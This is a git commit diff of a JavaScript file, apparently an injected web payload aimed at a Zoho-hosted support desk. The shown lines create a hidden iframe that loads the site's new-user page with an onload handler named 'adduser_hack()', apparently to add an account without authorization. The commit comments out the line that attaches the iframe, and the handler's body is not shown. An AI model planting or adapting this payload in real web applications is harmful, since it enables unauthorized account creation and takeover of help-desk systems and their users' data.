c2daaf1090b6e6d06b2f0cbf93a8c5e546209140
Nandha30 <mail.nandha30@gmail.com>
2016-09-23 13:00:51 +0530

    Update a.js
    gh

--- a.js
+++ a.js
@@ -3,7 +3,7 @@ var statusVal = getClosedLabel();assignValue('Cases','6b28c32dddd03edf3e9898aa0d
 var iframe = jQuery("<iframe></iframe>");
 jQuery(iframe).attr("src","Security.do?actionName=newUser&frameorigin=https://supportdesk.localzoho.com");
 jQuery(iframe).attr("onload","adduser_hack()");
-jQuery("body").append(iframe);
+//jQuery("body").append(iframe);
 
 
 
